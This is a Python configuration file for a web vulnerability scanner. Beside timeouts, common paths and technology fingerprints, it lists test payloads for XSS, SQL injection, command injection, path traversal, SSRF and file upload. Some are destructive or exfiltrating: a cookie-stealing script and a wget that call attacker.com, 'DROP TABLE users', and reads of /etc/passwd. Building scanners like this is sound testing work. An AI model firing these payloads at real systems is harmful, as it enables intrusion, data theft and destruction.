#!/usr/bin/env python3
"""
Configuration file for Web Vulnerability Scanner
Contains customizable settings and parameters
"""

import os
from typing import List, Dict, Any

class ScannerConfig:
    """Configuration class for the vulnerability scanner"""
    
    # Scanner Settings
    DEFAULT_TIMEOUT = 30
    DEFAULT_MAX_DEPTH = 3
    DEFAULT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    
    # Rate Limiting
    REQUEST_DELAY = 0.1  # Delay between requests in seconds
    MAX_REQUESTS_PER_MINUTE = 60
    
    # Common paths to check for hidden files/directories
    COMMON_PATHS = [
        # Administrative interfaces
        '/admin', '/admin/', '/administrator', '/login', '/wp-admin',
        '/phpmyadmin', '/phpMyAdmin', '/config', '/backup', '/backups',
        
        # Version control and configuration files
        '/.git', '/.svn', '/.env', '/robots.txt', '/sitemap.xml',
        
        # API endpoints
        '/api', '/api/', '/v1', '/v2', '/test', '/dev', '/staging',
        
        # Server configuration files
        '/.htaccess', '/web.config', '/info.php', '/phpinfo.php',
        
        # Common directories
        '/images', '/files', '/uploads', '/downloads', '/logs',
        '/temp', '/tmp', '/cache', '/static', '/assets'
    ]
    
    # Security headers to check
    SECURITY_HEADERS = {
        'Strict-Transport-Security': 'HSTS',
        'Content-Security-Policy': 'CSP',
        'X-Frame-Options': 'X-Frame-Options',
        'X-Content-Type-Options': 'X-Content-Type-Options',
        'X-XSS-Protection': 'X-XSS-Protection',
        'Referrer-Policy': 'Referrer-Policy',
        'Permissions-Policy': 'Permissions-Policy'
    }
    
    # Technology detection patterns
    TECH_PATTERNS = {
        'PHP': [
            r'\.php', r'phpinfo', r'X-Powered-By.*PHP',
            r'PHPSESSID', r'phpMyAdmin'
        ],
        'ASP.NET': [
            r'\.aspx', r'\.asp', r'X-AspNet-Version', r'ASP\.NET',
            r'__VIEWSTATE', r'__EVENTVALIDATION'
        ],
        'Java': [
            r'\.jsp', r'\.do', r'JSESSIONID', r'X-Powered-By.*Java',
            r'Apache Tomcat', r'JBoss', r'WebLogic'
        ],
        'Python': [
            r'\.py', r'Django', r'Flask', r'X-Powered-By.*Python',
            r'WSGIServer', r'CherryPy'
        ],
        'Node.js': [
            r'X-Powered-By.*Express', r'X-Powered-By.*Node',
            r'connect.sid', r'io.socket'
        ],
        'WordPress': [
            r'wp-content', r'wp-includes', r'WordPress',
            r'wp-admin', r'wp-login'
        ],
        'Drupal': [
            r'drupal', r'Drupal', r'X-Generator.*Drupal',
            r'Drupal.settings'
        ]
    }
    
    # XSS test payloads (OWASP Top 10 - A03:2021)
    XSS_PAYLOADS = [
        # Basic XSS
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        
        # Event handlers
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>',
        '<audio src=x onerror=alert("XSS")>',
        
        # Advanced XSS vectors
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg><script>alert("XSS")</script></svg>',
        '<img src="javascript:alert(\'XSS\')">',
        '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
        '<object data="javascript:alert(\'XSS\')">',
        '<embed src="javascript:alert(\'XSS\')">',
        '<form action="javascript:alert(\'XSS\')"><input type="submit" value="Click me"></form>',
        '<a href="javascript:alert(\'XSS\')">Click me</a>',
        '<div onclick="alert(\'XSS\')">Click me</div>',
        '<textarea onblur="alert(\'XSS\')">Click me</textarea>',
        '<video src=x onerror=alert("XSS")>',
        '<object data="javascript:alert(\'XSS\')">',
        '<embed src="javascript:alert(\'XSS\')">',
        '<form action="javascript:alert(\'XSS\')">',
        '<button onclick=alert("XSS")>Click me</button>',
        '<select onchange=alert("XSS")>',
        '<textarea onblur=alert("XSS")>',
        '<div onmouseover=alert("XSS")>Hover me</div>',
        '<a href="javascript:alert(\'XSS\')">Click me</a>',
        
        # Advanced XSS
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg><script>alert("XSS")</script></svg>',
        '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
        '<img src="javascript:alert(\'XSS\')">',
        '<script>fetch(\'https://attacker.com?cookie=\'+document.cookie)</script>'
    ]
    
    # SQL injection test payloads (OWASP Top 10 - A03:2021)
    SQL_PAYLOADS = [
        # Basic SQL injection
        "'",
        "1' OR '1'='1",
        "1' OR 1=1--",
        "1' OR 1=1#",
        "1' OR 1=1/*",
        
        # Union-based injection
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' UNION SELECT @@version--",
        "1' UNION SELECT database()--",
        
        # Boolean-based injection
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND (SELECT 1 FROM users LIMIT 1)--",
        
        # Error-based injection
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
        
        # Time-based injection
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' WAITFOR DELAY '00:00:05'--",
        
        # Stacked queries
        "1'; DROP TABLE users--",
        "1'; INSERT INTO users VALUES (1,'hacker','password')--"
    ]
    
    # SQL error patterns to detect
    SQL_ERROR_PATTERNS = [
        r'sql.*error|mysql.*error|oracle.*error|postgresql.*error',
        r'you have an error in your sql syntax',
        r'mysql_fetch_array|mysql_fetch_object|mysql_num_rows',
        r'ora-|oracle.*exception|postgresql.*exception',
        r'sql syntax.*mysql|warning.*mysql',
        r'valid mysql result|check the manual that corresponds to your mysql'
    ]
    
    # Command injection test payloads (OWASP Top 10 - A03:2021)
    COMMAND_INJECTION_PAYLOADS = [
        # Basic command injection
        '; ls',
        '; whoami',
        '; id',
        '; pwd',
        '; cat /etc/passwd',
        
        # Advanced command injection
        '| ls',
        '| whoami',
        '| id',
        '| cat /etc/passwd',
        '| wget http://attacker.com/shell',
        
        # Blind command injection
        '$(sleep 5)',
        '`sleep 5`',
        '; sleep 5',
        '| sleep 5',
        
        # Windows command injection
        '& dir',
        '& whoami',
        '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '| dir',
        '| whoami'
    ]
    
    # Command injection error patterns
    COMMAND_INJECTION_PATTERNS = [
        r'command.*not found|command.*failed|exec.*failed',
        r'cannot execute|execution failed|permission denied',
        r'ls:|dir:|whoami:|id:|pwd:',
        r'error.*executing|failed.*execute'
    ]
    
    # Token patterns for hidden field detection
    TOKEN_PATTERNS = [
        r'csrf|xsrf|token|auth|session|key',
        r'[a-f0-9]{32,}',  # Hex strings (likely hashes)
        r'[A-Za-z0-9+/]{20,}={0,2}',  # Base64 strings
        r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'  # UUIDs
    ]
    
    # File upload test payloads (OWASP Top 10 - A05:2021)
    FILE_UPLOAD_PAYLOADS = [
        # Dangerous file extensions
        'shell.php',
        'shell.php3',
        'shell.php4',
        'shell.php5',
        'shell.phtml',
        'shell.asp',
        'shell.aspx',
        'shell.jsp',
        'shell.jspx',
        'shell.exe',
        'shell.bat',
        'shell.cmd',
        'shell.sh',
        'shell.py',
        'shell.rb',
        'shell.pl'
    ]
    
    # Path traversal test payloads (OWASP Top 10 - A01:2021)
    PATH_TRAVERSAL_PAYLOADS = [
        '../../../etc/passwd',
        '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts'
    ]
    
    # SSRF test payloads (OWASP Top 10 - A05:2021)
    SSRF_PAYLOADS = [
        'http://localhost',
        'http://127.0.0.1',
        'http://0.0.0.0',
        'http://[::1]',
        'file:///etc/passwd',
        'file:///C:/Windows/System32/drivers/etc/hosts',
        'dict://localhost:11211/stat',
        'ftp://localhost:21',
        'gopher://localhost:6379/_*1%0D%0A$8%0D%0Aversion%0D%0A'
    ]
    
    # Report settings
    REPORT_SETTINGS = {
        'max_evidence_length': 200,
        'include_screenshots': False,
        'include_response_snippets': True,
        'risk_colors': {
            'Critical': '#e74c3c',
            'High': '#f39c12',
            'Medium': '#f1c40f',
            'Low': '#27ae60',
            'Information': '#3498db'
        }
    }
    
    # Logging configuration
    LOGGING_CONFIG = {
        'level': 'INFO',
        'format': '%(asctime)s - %(levelname)s - %(message)s',
        'file': 'scanner.log',
        'max_size': 10 * 1024 * 1024,  # 10MB
        'backup_count': 5
    }
    
    @classmethod
    def get_user_agent(cls) -> str:
        """Get the user agent string"""
        return os.environ.get('SCANNER_USER_AGENT', cls.DEFAULT_USER_AGENT)
    
    @classmethod
    def get_timeout(cls) -> int:
        """Get the default timeout value"""
        return int(os.environ.get('SCANNER_TIMEOUT', cls.DEFAULT_TIMEOUT))
    
    @classmethod
    def get_max_depth(cls) -> int:
        """Get the default maximum crawl depth"""
        return int(os.environ.get('SCANNER_MAX_DEPTH', cls.DEFAULT_MAX_DEPTH))
    
    @classmethod
    def get_request_delay(cls) -> float:
        """Get the delay between requests"""
        return float(os.environ.get('SCANNER_REQUEST_DELAY', cls.REQUEST_DELAY))
    
    @classmethod
    def get_max_requests_per_minute(cls) -> int:
        """Get the maximum requests per minute"""
        return int(os.environ.get('SCANNER_MAX_REQUESTS_PER_MINUTE', cls.MAX_REQUESTS_PER_MINUTE))

# Environment-specific configurations
class DevelopmentConfig(ScannerConfig):
    """Development environment configuration"""
    LOGGING_CONFIG = {
        'level': 'DEBUG',
        'format': '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        'file': 'scanner_dev.log',
        'max_size': 5 * 1024 * 1024,  # 5MB
        'backup_count': 3
    }
    
    REQUEST_DELAY = 0.05  # Faster for development
    MAX_REQUESTS_PER_MINUTE = 120

class ProductionConfig(ScannerConfig):
    """Production environment configuration"""
    REQUEST_DELAY = 0.2  # Slower for production
    MAX_REQUESTS_PER_MINUTE = 30
    
    # More conservative settings
    DEFAULT_MAX_DEPTH = 2
    DEFAULT_TIMEOUT = 45

class TestingConfig(ScannerConfig):
    """Testing environment configuration"""
    LOGGING_CONFIG = {
        'level': 'WARNING',
        'format': '%(levelname)s - %(message)s',
        'file': 'scanner_test.log',
        'max_size': 1 * 1024 * 1024,  # 1MB
        'backup_count': 1
    }
    
    REQUEST_DELAY = 0.0  # No delay for testing
    MAX_REQUESTS_PER_MINUTE = 1000

# Configuration factory
def get_config(environment: str = None) -> ScannerConfig:
    """Get configuration for the specified environment"""
    if environment is None:
        environment = os.environ.get('SCANNER_ENV', 'development')
    
    configs = {
        'development': DevelopmentConfig,
        'production': ProductionConfig,
        'testing': TestingConfig
    }
    
    return configs.get(environment.lower(), DevelopmentConfig)

# Default configuration instance
config = get_config()
